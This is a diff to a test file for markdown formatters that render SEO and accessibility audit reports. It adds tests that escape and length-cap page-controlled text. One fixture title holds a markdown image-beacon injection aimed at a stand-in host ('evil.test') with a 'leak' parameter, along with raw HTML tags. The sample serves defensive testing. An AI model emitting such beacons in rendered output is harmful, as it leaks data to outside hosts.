@@ -103,9 +103,23 @@ describe('formatters', () => {
     const md = formatSeoMarkdown(mockSeo);
     expect(md).toContain('# 🔍 SEO Audit Report');
     expect(md).toContain('**Score**: **95 / 100**');
-    expect(md).toContain('"Example Domain \'with\' ticks"');
+    expect(md).toContain('"Example Domain \\`with\\` ticks"');
     expect(md).toContain('**Canonical**: https://example.com/');
     expect(md).toContain('🟢 PASS');
+  });
+
+  it('escapes markdown in page-controlled text so it cannot inject images or links', () => {
+    const md = formatSeoMarkdown({ ...mockSeo, title: '![beacon](https://evil.test/x?leak=1) <b>hi</b> | col' });
+    expect(md).not.toContain('![beacon](');
+    expect(md).toContain('\\!\\[beacon\\]\\(https://evil.test/x?leak=1\\)');
+    expect(md).toContain('\\<b\\>hi\\</b\\>');
+    expect(md).toContain('\\|');
+  });
+
+  it('caps long page-controlled values', () => {
+    const md = formatSeoMarkdown({ ...mockSeo, title: 'a'.repeat(5000) });
+    expect(md).not.toContain('a'.repeat(1000));
+    expect(md).toContain('…');
   });
 
   it('formats Security markdown with header overview', () => {
@@ -123,7 +137,7 @@ describe('formatters', () => {
   it('formats Accessibility markdown with summary metrics', () => {
     const md = formatA11yMarkdown(mockA11y);
     expect(md).toContain('**Images Without Alt**: 0 / 4');
-    expect(md).toContain('2 skip(s) detected');
+    expect(md).toContain('2 skipped level(s)');
     expect(md).toContain('🟡 WARN');
   });
 
